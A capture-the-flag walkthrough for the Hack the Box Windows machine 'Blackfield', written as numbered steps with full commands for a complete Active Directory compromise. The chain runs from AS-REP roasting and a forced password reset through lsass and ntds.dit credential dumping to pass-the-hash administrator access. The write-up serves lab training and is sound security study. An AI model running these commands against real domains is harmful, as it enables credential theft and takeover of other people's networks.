# Blackfield

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Hard**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

<img width="912" height="443" alt="image" src="https://github.com/user-attachments/assets/d44570cb-edcc-41f3-a6af-2078cdb5ab70" />

2. SMB allows anonymous logon. We find a profiles$ share that has a list of users so create a user list from it.

`smbclient //blackfield.local/profiles$ -U '' -c ls | awk '{print $1}' > users.list`

3. Now that we have a users list, we will try ASREPRoasting to get a user hash and gain an initial foothold in the domain.

`GetNPUsers.py -request -usersfile users.list -outputfile asreproastables.txt -dc-ip 10.129.229.17 -format hashcat 'blackfield.local/'`

<img width="910" height="108" alt="image" src="https://github.com/user-attachments/assets/097681fb-ab6e-4777-8df8-5e7f5a8b9030" />

4. Success! Now crack the hash and we get user support's credentials. 

`hashcat -m 18200 asreproastables.txt /usr/share/wordlists/rockyou.txt`

5. Now that we have a valid credentials on the domain, we run Bloodhound to enumerate the network

`sudo bloodhound-python -d blackfield.local -u support -p $(cat recon/support.pass) -ns 10.129.229.17 -c all` 

6. Load files onto Bloodhound and find a path from support user to machine

<img width="708" height="96" alt="image" src="https://github.com/user-attachments/assets/26b38ef7-a133-462a-8ee1-ac1240140707" />

7. Since the user support can change Audit2020's password, we will change password and enumerate further with Audit2020's credentials.

`bloodyAD --host 10.129.229.17 -d blackfield.local -u support -p $(cat ../recon/support.pass) set password Audit2020 Password1`

<img width="907" height="319" alt="image" src="https://github.com/user-attachments/assets/688e3680-1ff9-4010-9be4-11f626c62e5b" />

8. The Audit2020 user has READ permissions on the forensics share. Enumerating through the share, we find a lsass.zip file in the memory_analysis folder. We unzip it and we get a lsass dump file

<img width="618" height="510" alt="image" src="https://github.com/user-attachments/assets/41073ef3-7590-4183-94a0-c7ac67294a53" />

9. Extract credentials offline from the lsass file using Pypykatz

`pypykatz lsa minidump lsass.DMP`

<img width="815" height="773" alt="image" src="https://github.com/user-attachments/assets/8b778b24-fd1c-49a0-87c3-99a0556d4a3c" />

10. Svc_backup user can PSRemote into the machine, so we evil-winrm into the host and get the user flag!

<img width="483" height="216" alt="image" src="https://github.com/user-attachments/assets/8ecebf9b-efc6-4cc3-a7bd-a1b3d79f7a07" />

11. Once we remote in, we do basic enumeration and discover we have the SeBackupPrivilege.

`whoami /priv`

12. With wbadmin, we can backup and get a copy of any file on the machine, so we copy the ntds.dit file

`wbadmin start backup -quiet -backuptarget:\\dc01\c$\Users\svc_backup\Desktop -include:C:\windows\ntds`

`wbadmin get versions`

`wbadmin start recovery -quiet -version:09/05/2025-15:31 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoveryTarget:c:\Users\svc_backup\Desktop -notRestoreAcl`

<img width="912" height="702" alt="image" src="https://github.com/user-attachments/assets/301c5b28-279f-4269-8504-3a2789dcc040" />

<img width="910" height="368" alt="image" src="https://github.com/user-attachments/assets/72c1af2c-9fb8-42c6-812d-f22fbccfd82c" />

13. Transfer ntds.dit file onto local machine.

`download ntds.dit`

14. Also get a copy of the SYSTEM and SAM files and transfer onto local machine with the download command

`reg copy hklm\system C:\Users\svc_backup\Desktop\system.save`

`reg copy hklm\sam C:\Users\svc_backup\Desktop\sam.save`

15. Run secretsdump on the system, sam and ntds.dit files to extract hashes offline

`secretsdump.py -ntds ntds.dit -system system.save -sam sam.save LOCAL`

<img width="886" height="393" alt="image" src="https://github.com/user-attachments/assets/3e5e6e0d-052b-4dfb-ad11-e45cb4203f2f" />

16. Passing the Hash for the administrator allows us to evil-winrm into the machine as Administrator and get the root flag!

`evil-winrm -i blackfield.local -u administrator -H $(cat administrator_ntds.hash)`

<img width="527" height="246" alt="image" src="https://github.com/user-attachments/assets/2bbdc903-5cab-45c2-8003-aeca8e1a6eab" />

